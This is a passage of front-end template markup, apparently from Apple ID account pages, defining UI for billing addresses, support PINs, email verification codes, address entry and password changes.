        {(billing-address-errors)}="errors.billingAddress"
        {(name-on-card-errors)}="errors.nameOnCard"
        {(phone-number-errors)}="errors.phoneNumber"
        {use-popover}="usePopover"
        {^@validate-address}="validateAddress"
        {^is-billing-address-dirty}="isBillingAddressDirty"
        {initial-billing-address}="initialBillingAddress"
        {^new-billing-address}="newBillingAddress"
        {^new-address-features}="newAddressFeatures"
        {(name-on-card)}="nameOnCard"
        {show-phone-input}="showPhoneInputInBillingAddress"
        {(phone-number)}="phoneNumber">
    </billing-address>
</div>

</script>
<script type="text/stache" id="jstache_132772044">


<div class="detail">
    {{accountPaymentMethod.paymentMethodName}} {{accountPaymentMethod.paymentMethodDetail}}
</div>

</script>
<script type="text/stache" id="jstache_842337574">


<div class="flow-subsection address-view-section">
    {{#if addressTitle}}<h3 class="section-subtitle">{{addressTitle}}</h3>{{/if}}
    <address-view {address}="address" {address-features}="addressFeatures"></address-view>
    {{#if phoneNumber.northAmericaDialCode}}
        <span class="force-ltr">
            {{phoneNumber.fullNumberWithoutCountryPrefix}}
        </span>
    {{else}}
        <span class="force-ltr">
            {{phoneNumber.fullNumberWithCountryPrefix}}
        </span>
    {{/if}}
</div>
</script>
<script type="text/stache" id="jstache_195660210">


<div class="flow-subsection address-view-section">
    {{#if addressTitle}}<h3 class="section-subtitle">{{addressTitle}}</h3>{{/if}}
    {{#is nameOrder "firstName/lastName"}}
    <span class="show wrap">{{address.recipientFirstName}} {{address.recipientLastName}}</span>
    {{else}}
    <span class="show wrap">{{address.recipientLastName}} {{address.recipientFirstName}}</span>
    {{/is}}
    <span class="show wrap">{{address.company}}</span>
    <address-view {address}="address" {address-features}="addressFeatures"></address-view>
</div>
</script>
<script type="text/stache" id="jstache_794022806">


<div class="detail">
    {{#if familyPaymentMethod.carrierBilling}}
    <span class="force-ltr">{{familyPaymentMethod.paymentMethodDetail}}</span>
    <small class='not-mobile inline'>({{familyPaymentMethod.paymentMethodName}})</small>
    {{else}}
    <span class="force-ltr">{{familyPaymentMethod.paymentMethodName}}</span>
    <small class="not-mobile inline">(Family Card)</small>
    {{/if}}
</div>



</script>
<script type="text/stache" id="jstache_512609385">


<div class="section-title wrap-section-title">
    {{#if cancelButtonText}}
    <button class="btn btn-link btn-overlay btn-cancel btn-left"
            ($click)="clicked('cancelClicked')"
            role="button"
            {{#if cancelButtonDisabled}}disabled{{/if}}>{{cancelButtonText}}</button>
    {{/if}}
    {{#if sectionTitle}}
    <h2 class="wrap-popover-title toolbar-title">{{sectionTitle}}</h2>
    {{/if}}

    {{#if loading}}
         <div class="toolbar-spinner">
            <loading loading="{loading}"></loading>
         </div>
    {{else}}
         {{#if actionButtonText}}
               <button class="btn btn-link btn-overlay btn-action btn-right"
               ($click)="clicked('actionClicked')" role="button"
               {{#if actionButtonDisabled}}disabled{{/if}}>{{actionButtonText}}</button>
         {{/if}}
    {{/if}}
</div>
</script>
<script type="text/stache" id="jstache_111824278">


<div class="modal default-dialog support-modal" id="supportPinModalId"  aria-labelledby="supportPinTitle">
    <div class="modal-dialog">
        <div class="modal-content no-outline" role="dialog" aria-describedby="supportPinHeading" tabindex="0">
            <div class="modal-wrapper no-outline" role="dialog" aria-describedby="supportPinHeading" tabindex="-1">
                <div class="modal-body support-pin-flow">
                    <div class="modal-header">
                        <h4 class="modal-title" id="supportPinHeading">
                            Temporary Support PIN
                        </h4>
                    </div>
                    {{#supportModel.pin}}
                        <div class="pin body-text">
                            Your Temporary Support PIN is: <strong>{{supportModel.pin}}</strong>
                        </div>
                        <div class="pin-info body-text">
                            <span class="timestamp">
                                This PIN is valid until {{formatDate supportModel.date "hh:mm A" config}}.
                            </span>
                        </div>
                    {{else}}
                        <p class="body-text">When you contact Apple Support on the phone or online, we may ask you for a 4-digit PIN to verify your identity.</p>
                    {{/supportModel.pin}}
                </div>
                <div class="modal-footer clearfix">
                    {{#if supportModel.pin}}
                        <div class="btn-group flow-controls pull-left generate-pin-wrapper{{#if state.resend}} loading{{/if}}">
                            <button type="button" class="btn btn-link generatepin">
                            {{#isRepair}}
                                {{^if resendLoading}}
                                    <i class="icon icon_reload{{#if resendLoading}} icon_process rotate{{/resendLoading}}"></i> Generate New PIN
                                {{else}}
                                    Generating PIN
                                {{/resendLoading}}
                            {{else}}
                                {{^if resendLoading}}
                                    <i class="icon icon_reload{{#if resendLoading}} icon_process rotate{{/resendLoading}}"></i> Generate New PIN
                                {{else}}
                                    <loading loading="{resendLoading}"></loading>  Generating PIN
                                {{/resendLoading}}
                            {{/isRepair}}
                            </button>
                            {{#isRepair}}
                                <div id="regenerateLoading" class="spin regenerate-loading"></div>
                            {{/isRepair}}
                            {{#if showErrors}}
                                <div class="errorPop-body popover" role="tooltip">
                                    <div class="errorPop-arrow arrow"></div>
                                    <div class="errorPop-content popover-content">
                                        {{errors.supportpin.main.message}}
                                    </div>
                                </div>
                            {{/if}}
                        </div>
                    {{/if}}
                    <div class="btn-group flow-controls pull-right{{#if state.loading}} loading{{/if}}">
                        {{^supportModel.pin}}
                            {{#isRepair}}
                                <div id="generateLoading" class="spin"></div>
                            {{else}}
                                <loading loading="{continueLoading}"></loading>
                            {{/isRepair}}


                            <button type="button" class="btn btn-link last generate pull-right">
                                Generate PIN
                            </button>
                            <button type="button" class="btn btn-link first cancel" data-dismiss="modal">
                                Cancel
                            </button>
                        {{/supportModel.pin}}

                        {{#if supportModel.pin}}
                            <button type="button" class="btn btn-link ok" data-dismiss="modal">
                                OK
                            </button>
                        {{/supportModel.pin}}
                        {{#if showErrors}}
                            <div class="errorPop-body popover" role="tooltip">
                                <div class="errorPop-arrow arrow"></div>
                                <div class="errorPop-content popover-content">
                                    {{errors.supportpin.main.message}}
                                </div>
                            </div>
                        {{/if}}
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
</script>
<script type="text/stache" id="jstache_1049310239">


<div class="modal fade flow-dialog default-dialog cvv-helper-dialog in" id="cvvHelperModal" role="dialog" aria-hidden="true">
    <div class="modal-dialog reduced-width">
        <div class="modal-content">
            <div class="modal-wrapper">
                <div class="modal-body cvv-helper-flow">
                    <div class="cvv-title">
                        Where to find your Security Code:
                    </div>
                    <div class="cvv-visa">
                        <div class="cvv-sub-title">Visa / Mastercard / Discover:</div>
                        <img src="https://appleid.cdn-apple.com/static/bin/cb557578914/dist/assets/images/cvv_visa_mc.png" class="credit-card" />
                    </div>
                    <div class="cvv-amex">
                        <div class="cvv-sub-title">American Express:</div>
                        <img src="https://appleid.cdn-apple.com/static/bin/cb2499579377/dist/assets/images/cvv_amex.png" class="credit-card" />
                    </div>
                </div>
                <div class="modal-footer clearfix">
                    <div class="btn-group flow-controls pull-right">
                        <button type="button" class="btn btn-link dismiss reduced-right" data-dismiss="modal">
                            OK
                        </button>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
</script>
<script type="text/stache" id="jstache_326726498">


<div class="step step{{step}} flow-changeappleID">
    <div class="popover-body">

        {{#is step "1"}}
            <div class="details">
                <label for="appleIDEmail" class="flow-label"> Enter a new email address to be used as your Apple ID:</label>
            </div>
            <div class="row">
                <div class="col-sm-12">
                    <div class="pop-wrapper field-pop-wrapper">

                    <email-input errors="{errors.email}" value="{newEmail}" placeholder='name@example.com' classlist="form-control" inputid="appleIDEmail" no-validation="true"></email-input>
                    {{#showRecycledDomainWarning}}
                    <recycled-domain-warning></recycled-domain-warning>
                    {{/showRecycledDomainWarning}}
                    {{#if errors.email.showErrors}}
                        <div class="errorPop-body popover" role="tooltip">
                            <div class="errorPop-arrow arrow"></div>
                            <div class="errorPop-content popover-content">
                                {{#errors.email.map.unchanged}}
                                    This email address is not available for use as a new Apple ID.
                                {{else}}
                                    {{errors.email.main.message}}
                                {{/if}}
                            </div>
                        </div>
                    {{/if}}
                    </div>
                </div>
            </div>
            <div class="aid-footer flow-footer clearfix">
                <div class="btn-group flow-controls pull-right">
                    <loading loading="{continueLoading}"></loading>
                    <button type="button" class="btn btn-link first cancel" data-dismiss="popover">Cancel</button>
                    <button type="button" class="btn btn-link last continue"{{^continueEnabled}} disabled{{/if}}{{#errors.email.hasErrors}} disabled{{/if}}>
                        <span class="mobile-only">Next</span><span class="not-mobile">Continue</span>
                    </button>
                </div>
            </div>
        {{/is}}

        {{#is step "aliasWarning"}}
            <change-into-alias-warning {new-email}="newEmail"
                                       {aliases}="account.aliases"
                                       {change-loading}="aliasLoading"
                                       (aliasWarningCancel)="aliasWarningCancel"
                                       (aliasWarningChange)="aliasWarningChange"
                                       {errors}="errors.alias">

            </change-into-alias-warning>
        {{/is}}

        {{#is step "2"}}
            <div class="intro security-code-alignment">
              <div class="mobile-only">
                An email with a verification code has been sent to <span class="graceful-wrap">{{newEmail}}.</span> Enter the code here:
              </div>
              <div class="not-mobile">
                An email with a verification code has been sent to <span class="graceful-wrap">{{newEmail}}.</span> Enter the code here:
              </div>
            </div>
            <div class="mobile-only">
            <br>
            </div>
            <div class="details">
                <div class="pop-wrapper field-pop-wrapper clearfix">
                    <div class="security-code-wrapper security-code-alignment">
                        <security-code use-popover="true" {(error-message)}="errors.code.main.message" length="{codeLength}" code="{code}" didReachMaxLength="{didReachMaxLength}" blur-on-complete="false" type="tel"></security-code>
                    </div>
               </div>
            </div>

            <div class="aid-footer flow-footer clearfix resend-code-btn">
                <div class="btn-group flow-controls pull-left{{#is loading 'resend'}} loading{{/is}}">
                    <div class="pop-wrapper field-pop-wrapper resend-code-wrapper">
                        <button type="button" class="btn btn-link resend
                        new-code"{{#resendLoading}} disabled{{/if}}{{#errors.code.hasErrors}}
                        disabled{{/if}}{{#verifyLoading}} disabled{{/if}}>
                            {{^if resendLoading}}
                                <i class="icon icon_reload"></i> Send a new code
                            {{else}}
                                <loading loading="{resendLoading}"></loading> Sending Code
                            {{/resendLoading}}
                        </button>
                    </div>
                </div>

                <div class="btn-group flow-controls pull-right{{#is loading 'verify'}} loading{{/is}}">
                    <loading loading="{verifyLoading}"></loading>
                    <button type="button" class="btn btn-link first cancel">Cancel</button>
                    <button type="button" class="btn btn-link last verify"{{^didReachMaxLength}} disabled{{/if}}{{#verifyLoading}} disabled{{/if}}>Verify</button>
                </div>
            </div>
        {{/is}}
    </div>
</div>

</script>
<script type="text/stache" id="jstache_527474058">


<div class="step step{{step}} flow-change-appleID-alias">
    <div class="popover-body">
        <div class="details">
            {{#unless isDifferentMacAlias}}
            <p>Choose the email address to use as your Apple ID:</p>
            {{else}}
            <p>Choose the address to use as your Apple ID. If you make this change, you will not be able to go back to your current Apple ID, <strong>{{account.name}}</strong></p>
            {{/unless}}
        </div>
        <div class="row">
            <div class="col-sm-12">
                <div class="pop-wrapper field-pop-wrapper">
                    <div class="alias-list-wrapper">
                        {{#each composeAliasList(account.name, account.aliases)}}
                        <div class="alias-row">
                            <label for="alias-{{.}}" class="appleid-alias">
                                <input id="alias-{{.}}" name="appleid-aliases" type="radio" class="appleid-alias-option" value='{{.}}' {{#str_eq account.name .}}checked{{/str_eq}} />
                                <span class="alias-name">{{.}}</span>
                            </label>
                        </div>
                        {{/each}}
                    </div>
                    {{#if errors.alias.hasErrors}}
                    <div class="popover errorPop-body top" role="tooltip">
                        <div class="errorPop-arrow arrow"></div>
                        <div class="errorPop-content popover-content">
                            {{errors.alias.main.message}}
                        </div>
                    </div>
                    {{/if}}
                </div>
            </div>
        </div>
        <div class="aid-footer flow-footer clearfix">
            <div class="btn-group flow-controls pull-right">
                <span class="not-mobile-inline"><loading loading="{isContinueLoading}"></loading></span>
                <button type="button" class="btn btn-link first cancel" data-dismiss="popover">Cancel</button>
                <button type="button" class="btn btn-link last not-mobile continue"{{^isContinueEnabled}} disabled{{/if}}>Continue</button>
                <button type="button" class="btn btn-link last mobile-only continue"{{^isContinueEnabled}} disabled{{/if}}>
                    {{#unless isContinueLoading}} Next{{/unless}}
                    <loading loading="{isContinueLoading}"></loading>
                </button>
            </div>
        </div>
    </div>
</div>

</script>
<script type="text/stache" id="jstache_459395050">


<div class="step step{{step}} flow-change-primary-email">
    <div class="popover-body">

        {{#is step "1"}}
            <div class="details">
                <label for="primaryEmail" class="flow-label"> Enter a new email address to use as your primary email:</label>
            </div>
            <div class="row">
                <div class="col-sm-12">
                    <div class="pop-wrapper field-pop-wrapper">

                    <email-input errors="{errors.email}" value="{newEmail}" placeholder='name@example.com' classlist="form-control" inputid="primaryEmail" no-validation="true"></email-input>
                    {{#showRecycledDomainWarning}}
                    <recycled-domain-warning></recycled-domain-warning>
                    {{/showRecycledDomainWarning}}
                    {{#if errors.email.showErrors}}
                        <div class="errorPop-body popover" role="tooltip">
                            <div class="errorPop-arrow arrow"></div>
                            <div class="errorPop-content popover-content">
                                {{#errors.email.map.unchanged}}
                                    This email address is not available for use as a new primary email address.
                                {{else}}
                                    {{errors.email.main.message}}
                                {{/if}}
                            </div>
                        </div>
                    {{/if}}
                    </div>
                </div>
            </div>
            <div class="aid-footer flow-footer clearfix">
                <div class="btn-group flow-controls pull-right">
                    <loading loading="{continueLoading}"></loading>
                    <button type="button" class="btn btn-link first cancel" data-dismiss="popover">Cancel</button>
                    <button type="button" class="btn btn-link last continue"{{^continueEnabled}} disabled{{/if}}{{#errors.email.hasErrors}} disabled{{/if}}>
                        <span class="mobile-only">Next</span><span class="not-mobile">Continue</span>
                    </button>
                </div>
            </div>
        {{/is}}

        {{#is step "2"}}
            <div class="intro">
                An email with a verification code has been sent to <span class="graceful-wrap">{{newEmail}}.</span> Enter the code here:
            </div>

            <div class="details">
                <div class="pop-wrapper field-pop-wrapper clearfix">
                    <div class="security-code-wrapper pull-left">
                        <security-code length="{codeLength}" code="{code}" didReachMaxLength="{didReachMaxLength}" blur-on-complete="{blurOnComplete}" type="tel" localisedigit="Digit"></security-code>
                    </div>
                        {{#if errors.code.hasErrors}}
                        <div class="popover errorPop-body" role="tooltip">
                            <div class="errorPop-arrow arrow"></div>
                            <div class="errorPop-content popover-content">
                                {{{errors.code.main.message}}}
                            </div>
                        </div>
                    {{/if}}
                </div>
            </div>

            <div class="aid-footer flow-footer clearfix">
                <div class="btn-group flow-controls pull-left{{#is loading 'resend'}} loading{{/is}}">
                    <div class="pop-wrapper field-pop-wrapper resend-code-wrapper">
                        <button type="button" class="btn btn-link resend new-code"{{#resendLoading}} disabled{{/if}}{{#errors.email.hasErrors}} disabled{{/if}}{{#verifyLoading}} disabled{{/if}}>
                            {{^if resendLoading}}
                                <i class="icon icon_reload"></i> Send a new code
                            {{else}}
                                <loading loading="{resendLoading}"></loading> Sending Code
                            {{/resendLoading}}
                        </button>
                    </div>
                    {{#if errors.email.hasErrors}}
                        <div class="popover errorPop-body bottom fade in error-email-popover" role="tooltip">
                            <div class="errorPop-arrow arrow"></div>
                            <div class="errorPop-content popover-content">
                                {{{errors.email.main.message}}}
                            </div>
                        </div>
                    {{/if}}
                </div>

                <div class="btn-group flow-controls pull-right{{#is loading 'verify'}} loading{{/is}}">
                    <loading loading="{verifyLoading}"></loading>
                    <button type="button" class="btn btn-link first cancel">Cancel</button>
                    <button type="button" class="btn btn-link last verify"{{^didReachMaxLength}} disabled{{/if}}{{#verifyLoading}} disabled{{/if}}>Verify</button>
                </div>
            </div>
        {{/is}}
    </div>
</div>

</script>
<script type="text/stache" id="jstache_1876343136">


<div class="verify-email pull-right">
  <div class="pop-wrapper pop-inline">
    <button class="btn btn-link verify-pea">Verify </button>
    {{#flow}}
        <div class="popover pop-flow pop-verifyEmail" role="group" tabindex="-1" style="display: none;">
            <div id="arrow" class="pop-arrow arrow"></div>
            <div class="mobile-only section-title">
                <h2 class="wrap-popover-title">
                    Email
                </h2>
            </div>
            <div class="pop-content popover-content">
                <verifyprimaryemailflow address={account.person.primaryEmailAddress.address} account="{account}"></verifyprimaryemailflow>
            </div>
        </div>
    {{/flow}}
  </div>
</div>

</script>
<script type="text/stache" id="jstache_1236785315">


<div class="name-input">
  <input type="text" name="{{fieldname}}" id="{{fieldname}}"
         class="generic-input-field {{classes}} form-control field {{#if errors.hasErrors}} error has-errors{{/if}}"
         can-field="{value}"
         placeholder="{{placeholder}}"
         autocorrect="off"
         autocapitalize="on"
         autocomplete="off"
         spellcheck="false" />
</div>

</script>
<script type="text/stache" id="jstache_361112359">


<div class="idms-address">
    <h3 class="section-subtitle">{{sectionSubtitle}}</h3>
    <div class="pop-wrapper field-pop-wrapper">
        <div class="form-group ">
            <basic-input classes="content-input {{#if errors.line1.hasErrors}}error{{/if}} idms-address-line1"
                         sr-label-text='Street Address'
                         placeholder='street address'
                         is-required="true"
                         {^@validate}="validators.line1"
                         validate-on-blur='false'
                         {error-strings.empty}='localizedStrings.errors.empty.line1'
                         use-popover="true"
                         {(errors)}='errors.line1'
                         {(value)}="address.line1"></basic-input>
        </div>
    </div>

    <div class="pop-wrapper field-pop-wrapper">
        <div class="form-group">
            <basic-input classes="content-input form-control {{#if errors.line2.hasErrors}}error{{/if}} idms-address-line2"
                         is-required="false"
                         validate-on-blur='false'
                         sr-label-text='Address Line 2'
                         placeholder='apt., suite, bldg'
                         use-popover="true"
                         {(errors)}="errors.line2"
                         {(value)}="address.line2"></basic-input>
        </div>
    </div>

    {{#if addressFeatures.addrLine3Required}}
    <div class="pop-wrapper field-pop-wrapper">
        <div class="form-group">
            <basic-input classes="content-input {{#if errors.line3.hasErrors}}error{{/if}} idms-address-line3"
                         class="idms-address-line3"
                         sr-label-text='Address Line 3'
                         placeholder='line 3 (optional)'
                         is-required="false"
                         validate-on-blur='false'
                         use-popover="true"
                         {(errors)}="errors.line3"
                         {(value)}="address.line3"></basic-input>
        </div>
    </div>

    {{/if}}

    {{#if addressFeatures.suburbRequired}}
    <div class="pop-wrapper field-pop-wrapper">
        <div class="form-group">
            <basic-input classes="content-input {{#if errors.suburb.hasErrors}}error{{/if}} idms-address-suburb"
                         class="idms-address-suburb"
                         is-required="true"
                         sr-label-text='Suburb'
                         placeholder='town'
                         {^@validate}="validators.suburb"
                         validate-on-blur='false'
                         use-popover="true"
                         {error-strings.empty}='localizedStrings.errors.empty.suburb'
                         {(errors)}="errors.suburb"
                         {(value)}="address.suburb"></basic-input>
        </div>
    </div>
    {{/if}}

    {{#unless addressFeatures.hideCity}}
    <div class="pop-wrapper field-pop-wrapper">
        <div class="form-group">
            <basic-input classes="content-input {{#if errors.city.hasErrors}}error{{/if}} idms-address-city"
                         class="idms-address-city"
                         is-required="true"
                         sr-label-text='Town'
                         placeholder='city'
                         {^@validate}='validators.city'
                         validate-on-blur='false'
                         use-popover="true"
                         {error-strings.empty}='localizedStrings.errors.empty.city'
                         {(errors)}="errors.city"
                         {(value)}="address.city"></basic-input>
        </div>
    </div>
    {{/unless}}

    <div class="row mobile-narrow {{#if showTwoColumnsState}}two-columns{{/if}}">
        {{#if addressFeatures.countyRequired}}
        <div class="col-sm-12 col">
            <div class="pop-wrapper field-pop-wrapper">
                <div class="form-group">
                    <basic-input classes="content-input {{#if errors.county.hasErrors}}error{{/if}} idms-address-county"
                                 class="idms-address-county"
                                 is-required="true"
                                 sr-label-text='County'
                                 placeholder='county'
                                 {^@validate}="validators.county"
                                 validate-on-blur='false'
                                 use-popover="true"
                                 {error-strings.empty}='localizedStrings.errors.empty.county'
                                 {(errors)}="errors.county"
                                 {(value)}="address.county"></basic-input>
                </div>
            </div>
        </div>
        {{else}}
        {{#unless addressFeatures.hideState}}
        <div class="{{#if addressFeatures.hidePostalCode}}col-sm-12{{else}}col-sm-6{{/if}} col">
            <div class="pop-wrapper field-pop-wrapper">
                <div class="form-group">
                    <div class="{{#if hasStateProvinces}}select-wrapper{{/if}} clearfix">
                        <basic-input classes="content-input form-control {{#if errors.stateProvince.hasErrors}}has-errors error{{/if}} idms-address-state-province"
                                     sr-label-text='County'
                                     placeholder='county'
                                     {(value)}="address.stateProvince"
                                     {options}="stateProvinceOptions"
                                     {^@validate}="validators.state"
                                     validate-on-blur='false'
                                     use-popover="true"
                                     {error-strings.empty}='localizedStrings.errors.empty.stateProvince'
                                     {(errors)}="errors.stateProvince"></basic-input>
                    </div>
                </div>
            </div>
        </div>
        {{/unless}}
        {{/if}}

        {{#unless addressFeatures.hidePostalCode}}
        {{#if addressFeatures.zipCodeLabelRequired}}
        
        {{else}}
        
        {{/if}}
        <div class="{{#if addressFeatures.hideState}}col-sm-12{{else}}col-sm-6{{/if}} col">
            <div class="pop-wrapper field-pop-wrapper">
                <div class="form-group">
                    <basic-input classes="content-input {{#if errors.postalCode.hasErrors}}error{{/if}} idms-address-postal-code"
                                 class="idms-address-postal-code"
                                 sr-label-text='Postcode'
                                 placeholder='{{#if addressFeatures.zipCodeLabelRequired}}postcode{{else}}postcode{{/if}}'
                                 {^@validate}="validators.postalCode"
                                 validate-on-blur='false'
                                 {error-strings.empty}="postalCodeEmptyError"
                                 use-popover="true"
                                 {(errors)}="errors.postalCode"
                                 {(value)}="address.postalCode"></basic-input>
                </div>
            </div>
        </div>
        {{/unless}}
    </div>

    <div class="form-group {{#if initialAddressFeatures.allowChangeCountry}}select-wrapper{{/if}}">
        <label class="sr-only" for="idms-address-country-code{{uid}}">Country</label>
        {{#if initialAddressFeatures.allowChangeCountry}}
        <select class="country-picker form-control {{#if errors.countryCode.hasErrors}}has-errors{{/if}} idms-address-country"
                id="idms-address-country-code{{uid}}"
                name="idms-address-country-code{{uid}}"
                can-value="{address.countryCode}">
            <option value="" disabled>country</option>
            {{#each supportedCountryList}}
            <option value="{{code}}">{{name}}</option>
            {{/each}}
        </select>
        {{else}}
        <div class="country-static">
            <input disabled
                   class="form-control {{#if errors.countryCode.hasErrors}}has-errors{{/if}} form-control idms-address-country"
                   type="text"
                   id="idms-address-countryName{{uid}}"
                   name="idms-address-countryName{{uid}}"
                   value="{{address.countryName}}">
        </div>
        {{/if}}
    </div>

    {{#if showPhoneInput}}
    <div class="row">
        <div class="form-group">
    {{#unless phoneNumber.northAmericaDialCode}}
        {{#unless addressFeatures.hidePhoneAreaCode}}
            <div class="col-sm-5 col area-code-wrapper">
                <div class="form-group force-ltr">
                    <basic-input classes="content-input payment-phonenumber-areaCode"
                                 sr-label-text='Area Code'
                                 placeholder='area code'
                                 is-required='true'
                                 {^@validate}="validators.areaCode"
                                 validate-on-blur='false'
                                 error-strings.empty='Enter the phone number on the card, including the area code.'
                                 {use-popover}="usePopover"
                                 {(errors)}='phoneNumberErrors.areaCode'
                                 {(value)}="phoneNumber.areaCode"></basic-input>
                </div>
            </div>
        {{/unless}}
        <div class="{{#if addressFeatures.hidePhoneAreaCode}}col-sm-12{{else}}col-sm-7 phone-number-wrapper{{/if}} col">
            <div class="form-group force-ltr">
                <basic-input classes="content-input payment-phonenumber-number"
                             sr-label-text='Phone Number'
                             placeholder='phone number'
                             is-required='true'
                             {^@validate}="validators.phoneNumber"
                             validate-on-blur='false'
                             error-strings.empty='Enter your phone number.'
                             {use-popover}="usePopover"
                             {(errors)}='phoneNumberErrors.number'
                             {(value)}="phoneNumber.number"></basic-input>
            </div>
        </div>
       {{else}}
        <div class="col-sm-12 col">
            <div class="force-ltr">
                <basic-input classes="content-input payment-phonenumber-number"
                             sr-label-text='Phone Number'
                             placeholder='phone number'
                             is-required='true'
                             {^@validate}="validators.phoneNumber"
                             validate-on-blur='false'
                             error-strings.empty='Enter your phone number.'
                             {use-popover}="usePopover"
                             {(errors)}='phoneNumberErrors.number'
                             {(value)}="phoneNumber.number"></basic-input>
            </div>
        </div>
    {{/unless}}
        </div>
    </div>
    {{/if}}
</div>

</script>
<script type="text/stache" id="jstache_1582749262">


<div class="step step{{step}} flow-reachable">
  <div class="popover-body">
      {{#is step "1"}}
        <div class="details">
            <label class="flow-label">Enter your email address:</label>
        </div>
        <div class="row">
          <div class="col-sm-12">
              <div class="pop-wrapper field-pop-wrapper">
                  <div class="email-input-wrapper clearfix">
                    <email-input value="{newEmail}" errors="{errors.email}" placeholder='name@example.com' id="reachableEmail" autocomplete="off" no-validation="true"></email-input>
                      {{#if errors.email.showErrors}}
                      <div class="errorPop-body popover" role="tooltip">
                          <div class="errorPop-arrow arrow"></div>
                          <div class="errorPop-content popover-content">
                              {{#if errors.email.map.name_invalid}}
                                Enter a valid email address.
                              {{else}}
                                {{errors.email.main.message}}
                              {{/if}}
                          </div>
                      </div>
                      {{/if}}
                  </div>
              </div>
          </div>
        </div>
        <div class="aid-footer flow-footer clearfix">
            <div class="btn-group flow-controls pull-right{{#state.loading}} loading{{/if}}">
                <loading loading="{continueLoading}"></loading>
                <button type="button" class="btn btn-link first cancel" data-dismiss="popover"> Cancel</button>
                <button type="button" class="btn btn-link last continue"{{#continueLoading}} disabled{{/if}}{{^continueEnabled}} disabled{{/if}}{{#errors.email.hasErrors}} disabled{{/if}}>
                 <span class="mobile-only">Next</span><span class="not-mobile">Continue</span>
                 </button>
            </div>
        </div>
      {{/is}}

      {{#is step "2"}}
        <div class="details security-code-alignment">
          <div class="mobile-only">
          An email with a verification code has been sent to <span class="graceful-wrap">{{newEmail}}.</span> Enter the code here:
          </div>
          <div class="not-mobile">
          An email with a verification code has been sent to <span class="graceful-wrap">{{newEmail}}.</span> Enter the code here:
          </div>
        </div>
        <div class="mobile-only">
        <br>
        </div>
        <div class = "row">
          <div class="col-sm-12">
          <div class="details">
          <div class="pop-wrapper field-pop-wrapper clearfix">
           <div class="security-code-wrapper security-code-alignment">
             <security-code use-popover="true" {(error-message)}="errors.code.main.message" length="{codeLength}" code="{code}" didReachMaxLength="{didReachMaxLength}" blur-on-complete="false" type="tel"></security-code>
           </div>
       </div>
     </div>
          </div>
        </div>
        <div class="aid-footer flow-footer clearfix resend-code-btn">
          <div class="btn-group flow-controls pull-left{{#is loading 'resend'}} loading{{/is}}">
              <div class="pop-wrapper field-pop-wrapper resend-code-wrapper">
                  <button type="button" class="btn btn-link resend new-code"{{#resendLoading}}
                  disabled{{/if}}{{#resendDisabled}} disabled{{/if}}{{#verifyLoading}}
                  disabled{{/if}}>
                      {{^if resendLoading}}
                        <i class="icon icon_reload"></i> Send a new code
                      {{else}}
                        <loading loading="{resendLoading}"></loading> Sending Code
                      {{/resendLoading}}
                  </button>
              </div>
          </div>
          <div class="btn-group flow-controls pull-right{{#is loading 'verify'}} loading{{/is}}">
              <loading loading="{verifyLoading}"></loading>
              <button type="button" class="btn btn-link first cancel">Cancel</button>
              <button type="button" class="btn btn-link last verify"{{^didReachMaxLength}} disabled{{/if}}{{#verifyLoading}} disabled{{/if}}>Verify</button>
          </div>
        </div>
      {{/is}}
  </div>
</div>

</script>
<script type="text/stache" id="jstache_561310276">


<div class="pop-wrapper pop-inline remove-reachable-wrapper email{{ id }}">
    <button class="btn btn-link btn-icon btn-remove list-action remove-reachable {{anchorElement}}">
    <i class="icon icon_remove"></i><span class="sr-only">Delete {{address}}</span>
  </button>
  <idms-popover-modal  type="action" anchor-element=".{{anchorElement}}" {(show)}="showDeleteReachable">
<div class="popover-body idms-popover-modal-content">
  <div class="row">
    <div class="col-sm-12">
      <div class="mobile-only">
        <h4 class="idms-popover-modal-title">Delete <span>{{ address }}?</span></h4>
      </div>
      <div class="details idms-popover-modal-body">
        If you delete this address it will no longer be used as contact information for your account.
      </div>
    </div>
  </div>
</div>

<div class="popover-footer aid-footer idms-popover-modal-footer clearfix">
  <div class="btn-group flow-controls pull-right">
    <loading loading="{deletingEmail}"></loading>
    <button type="button" class="btn btn-link first cancel">Cancel</button>
    <button type="button" class="btn btn-link last delete">Delete</button>
  </div>
</div>
  </idms-popover-modal>
</div>

</script>
<script type="text/stache" id="jstache_289330136">


<div class="verify-email pull-right">
  <div class="pop-wrapper pop-inline">
    <button class="btn btn-link verify-reachable">Verify </button>
    {{#flow}}
        <div class="popover pop-flow pop-verifyEmail" role="group" tabindex="-1" style="display: none;">
            <div id="arrow" class="pop-arrow arrow"></div>
            <div class="mobile-only section-title">
                <h2 class="wrap-popover-title">
                    Email
                </h2>
            </div>
            <div class="pop-content popover-content">
                <verifyreachableflow emailid={emailid} address={address} account={account}></verifyreachableflow>
            </div>
        </div>
    {{/flow}}
  </div>
</div>

</script>
<script type="text/stache" id="jstache_1816166656">


<div class="flow-changePassword">
    <p class="details">
        If you think someone might know your password, you should sign out of the devices and websites that are using your Apple ID.
    </p>
    <p>
        You will be prompted to sign in again on any of the devices or websites that use your Apple ID.
    </p>
    <div class="popover-footer flow-footer clearfix">
        <div class="btn-group flow-controls pull-right">
            <button class="btn btn-link last go-back">
                <span class="mobile-only">
                    Back
                </span>
                <span class="not-mobile">
                    Go Back
                </span>
            </button>
        </div>
    </div>
</div>
</script>
<script type="text/stache" id="jstache_1722243210">


<div class="flow-changePassword">
    <div class="form-group clearfix">
        <div class="pop-wrapper field-pop-wrapper">
            <div class="field-wrapper field-current-password">
                <input aria-required="true" autocomplete="off" type="password" can-field="{currentPassword}" class="field form-field form-control{{#if fieldErrors.currentPassword.hasErrors}} error has-errors{{/if}}" id="currentPassword" placeholder='current password'>
            </div>
            {{#fieldErrors.currentPassword.showErrors}}
                <div class="errorPop-body popover" role="tooltip">
                    <div id="arrow" class="errorPop-arrow arrow"></div>
                    <div class="errorPop-content popover-content">
                        {{fieldErrors.currentPassword.main.message}}
                    </div>
                </div>
            {{/if}}
        </div>
    </div>
    <div class="form-group clearfix">
        <div class="password-wrapper">
            <div class="pop-wrapper field-pop-wrapper field-wrapper field-password">
                <div class="field-new-password">
                    <new-password classes="field form-field form-control" strength="{strength}" percentage="{percentage}" errors="{errors.password}" value="{password}" placeholder='new password' validate-on-blur="false"></new-password>
                </div>
                {{#fieldErrors.password.showErrors}}
                    <div class="errorPop-body popover" role="tooltip">
                        <div id="arrow" class="errorPop-arrow arrow"></div>
                        <div class="errorPop-content popover-content">
                            {{{fieldErrors.password.main.message}}}
                        </div>
                    </div>
                {{/if}}
            </div>
        </div>
    </div>
